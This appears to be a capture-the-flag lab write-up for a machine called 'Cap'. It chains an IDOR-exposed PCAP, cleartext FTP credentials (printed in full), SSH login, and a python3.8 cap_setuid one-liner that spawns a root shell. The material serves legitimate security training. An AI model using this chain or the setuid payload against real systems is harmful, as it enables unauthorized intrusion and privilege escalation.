## 🔍 Recon

Initial scan:
```bash
nmap -sV -sC -oN initial 10.129.242.125
```
![Nmap scan showing open services](/images/cap/nmap_scan.png)


While enumerating the web application I discovered an IDOR (insecure direct object reference) path under /data:
![Web application dashboard](/images/cap/dashboard.png)


**The data ID in the URL can be changed to reveal something interesting**

```firefox
http://10.129.242.125/data/0
```
Accessing the data endpoint allowed me to download a PCAP file capturing unencrypted FTP traffic.

## 🧩 PCAP Analysis & Credentials
I opened the PCAP in Wireshark and inspected the FTP traffic. Credentials were sent in cleartext; I recovered the following valid account:

**Nathan's Credentials**
username: nathan
password: Buck3tH4TF0RM3!
With those credentials I could log into the host as nathan (SSH).

## 🖥️ Foothold (SSH as nathan)
SSH into the box:

```bash
ssh nathan@10.129.242.125
 enter password: Buck3tH4TF0RM3!
```
![SSH as Nathan](/images/cap/ssh_nathan.png)

**Found the user flag:**

```bash
cat /home/nathan/user.txt
```

## 🔐 Privilege Escalation (file capabilities)
Local enumeration for Linux capabilities:

```bash
# list capabilities recursively from root (hide permission denied noise)
getcap -r / 2>/dev/null
```

**Relevant output:**

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
What this means: getcap shows POSIX file capabilities on binaries. The entry for /usr/bin/python3.8 includes cap_setuid, indicating that this binary can change its UID — it can be abused to escalate privileges without needing a password.

# Exploit (use with care; this is what I ran on the box):

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**That spawned a root shell:**
```bash
root@cap:~# whoami
root
```

## 🏁 Root Flag

```bash
cat /root/root.txt
```

## 🔑 Takeaways

IDORs can expose sensitive artifacts (PCAPs, backups) — always check object enumeration endpoints like /data/<id>.

PCAP analysis with Wireshark is invaluable for recovering plaintext credentials when services are unencrypted (FTP/HTTP basic auth).

Linux file capabilities (checked via getcap) often provide escalation paths; cap_setuid on an interpreter (python) is a high-impact finding.

When a binary has cap_setuid, carefully consider executing it to elevate privileges — prefer non-interactive, audited commands if available.
